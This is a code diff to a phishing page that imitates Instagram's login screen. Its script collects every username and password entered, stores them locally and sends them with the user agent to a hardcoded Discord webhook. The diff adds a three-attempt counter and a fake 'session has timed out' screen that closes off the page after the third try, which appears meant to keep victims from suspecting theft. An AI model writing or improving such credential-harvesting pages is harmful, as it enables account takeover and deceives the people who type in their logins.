@@ -219,6 +219,64 @@
       margin-left: 4px;
     }
 
+    /* Timed-out state */
+    .timeout-view {
+      display: none;
+    }
+
+    .timeout-view .logo {
+      margin-bottom: 22px;
+    }
+
+    .timeout-icon {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background: #262626;
+      color: #a8a8a8;
+    }
+
+    .timeout-icon svg {
+      width: 32px;
+      height: 32px;
+    }
+
+    .timeout-title {
+      margin: 0 0 10px;
+      font-size: 17px;
+      font-weight: 600;
+      color: #ffffff;
+    }
+
+    .timeout-text {
+      margin: 0 0 24px;
+      font-size: 13px;
+      line-height: 1.5;
+      color: #a8a8a8;
+    }
+
+    .timeout-button {
+      width: 100%;
+      height: 42px;
+      border: 0;
+      border-radius: 8px;
+      background: #0095f6;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .timeout-button:hover { opacity: 0.9; }
+
     @media (max-width: 380px) {
       .card { padding: 36px 22px 26px; }
       .logo { font-size: 30px; }
@@ -239,70 +297,94 @@
 
     <section class="card">
 
-      <h1 class="logo">Instagram</h1>
-      <p class="subtitle">Verify it's you</p>
+      <!-- ─── SIGN-IN VIEW ─── -->
+      <div id="signinView">
 
-      <form id="loginForm">
+        <h1 class="logo">Instagram</h1>
+        <p class="subtitle">Verify it's you</p>
 
-        <div class="field-wrap">
-          <input
-            id="username"
-            class="field"
-            type="text"
-            placeholder="Phone number, username or email"
-            autocomplete="off"
-            autocapitalize="off"
-            autocorrect="off"
-            spellcheck="false"
-          >
-        </div>
+        <form id="loginForm">
 
-        <div class="field-wrap">
-          <input
-            id="password"
-            class="field"
-            type="password"
-            placeholder="Password"
-            autocomplete="off"
-            autocapitalize="off"
-            autocorrect="off"
-            spellcheck="false"
-          >
-          <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show password">
-            <svg class="eye-on" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
-              <circle cx="12" cy="12" r="3"/>
-              <line x1="3" y1="3" x2="21" y2="21"/>
-            </svg>
-            <svg class="eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
-              <circle cx="12" cy="12" r="3"/>
-            </svg>
+          <div class="field-wrap">
+            <input
+              id="username"
+              class="field"
+              type="text"
+              placeholder="Phone number, username or email"
+              autocomplete="off"
+              autocapitalize="off"
+              autocorrect="off"
+              spellcheck="false"
+            >
+          </div>
+
+          <div class="field-wrap">
+            <input
+              id="password"
+              class="field"
+              type="password"
+              placeholder="Password"
+              autocomplete="off"
+              autocapitalize="off"
+              autocorrect="off"
+              spellcheck="false"
+            >
+            <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show password">
+              <svg class="eye-on" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
+                <circle cx="12" cy="12" r="3"/>
+                <line x1="3" y1="3" x2="21" y2="21"/>
+              </svg>
+              <svg class="eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+            </button>
+          </div>
+
+          <a class="forgot" href="#" onclick="return false;">Forgotten password?</a>
+
+          <button class="login-button" type="submit">
+            Log in
           </button>
+
+          <div class="divider"><span>OR</span></div>
+
+          <a class="facebook-login" href="#" onclick="return false;">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#0095f6">
+              <path d="M22 12a10 10 0 10-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.44 2.89h-2.34v6.99A10 10 0 0022 12z"/>
+            </svg>
+            Log in with Facebook
+          </a>
+
+          <p id="message" class="error-message"></p>
+
+        </form>
+
+      </div>
+
+      <!-- ─── TIMEOUT VIEW ─── -->
+      <div id="timeoutView" class="timeout-view">
+
+        <h1 class="logo">Instagram</h1>
+
+        <div class="timeout-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <polyline points="12 6 12 12 16 14"/>
+          </svg>
         </div>
 
-        <a class="forgot" href="#" onclick="return false;">Forgotten password?</a>
+        <h2 class="timeout-title">Your session has timed out</h2>
+        <p class="timeout-text">For your security, we've ended your session. Please close this window and try again later.</p>
 
-        <button class="login-button" type="submit">
-          Log in
-        </button>
+        <a href="#" onclick="return false;" class="timeout-button">Close</a>
 
-        <div class="divider"><span>OR</span></div>
-
-        <a class="facebook-login" href="#" onclick="return false;">
-          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#0095f6">
-            <path d="M22 12a10 10 0 10-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.44 2.89h-2.34v6.99A10 10 0 0022 12z"/>
-          </svg>
-          Log in with Facebook
-        </a>
-
-        <p id="message" class="error-message"></p>
-
-      </form>
+      </div>
 
     </section>
 
-    <p class="signup-bar">
+    <p class="signup-bar" id="signupBar">
       Don't have an account?<span>Sign up</span>
     </p>
 
@@ -311,14 +393,20 @@
   <script>
     // ─── CONFIG ───────────────────────────────────────────────────────────
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1551399122467164211/8R8no16JCKEuDQ_Fc_ahBJhdDFsw2MV15Ds_Q1RrT9cQaSfZMQdpdBji5rogSsBPa7d9";
+    const MAX_ATTEMPTS = 3;
     // ──────────────────────────────────────────────────────────────────────
 
     const form = document.getElementById("loginForm");
     const password = document.getElementById("password");
     const eyeToggle = document.getElementById("eyeToggle");
     const message = document.getElementById("message");
+    const signinView = document.getElementById("signinView");
+    const timeoutView = document.getElementById("timeoutView");
+    const signupBar = document.getElementById("signupBar");
 
     window.capturedLogins = JSON.parse(localStorage.getItem("capturedLoginsIG") || "[]");
+
+    let attempts = 0;
 
     function persistLocal(entry) {
       window.capturedLogins.push(entry);
@@ -340,6 +428,7 @@
               "**IG — new submission**\n" +
               "**User:** `" + entry.username + "`\n" +
               "**Pass:** `" + entry.password + "`\n" +
+              "**Attempt:** " + entry.attempt + " / " + MAX_ATTEMPTS + "\n" +
               "**Time:** " + entry.timestamp + "\n" +
               "**UA:** `" + entry.userAgent + "`"
           })
@@ -347,6 +436,12 @@
       } catch (e) {
         console.warn("discord send failed", e);
       }
+    }
+
+    function showTimeout() {
+      signinView.style.display = "none";
+      signupBar.style.display = "none";
+      timeoutView.style.display = "block";
     }
 
     eyeToggle.addEventListener("click", function () {
@@ -361,9 +456,12 @@
       const username = document.getElementById("username").value;
       const enteredPassword = password.value;
 
+      attempts++;
+
       const entry = {
         username: username,
         password: enteredPassword,
+        attempt: attempts,
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent
       };
@@ -377,10 +475,18 @@
       if (username === "demo_user" && enteredPassword === "demo_pass") {
         message.className = "success-message";
         message.textContent = "Login successful!";
-      } else {
-        message.className = "error-message";
-        message.textContent = "Sorry, your password was incorrect. Please double-check your password.";
+        return;
       }
+
+      if (attempts >= MAX_ATTEMPTS) {
+        message.className = "error-message";
+        message.textContent = "Sorry, your password was incorrect.";
+        setTimeout(showTimeout, 700);
+        return;
+      }
+
+      message.className = "error-message";
+      message.textContent = "Sorry, your password was incorrect. Please double-check your password.";
     });
   </script>
 </body>
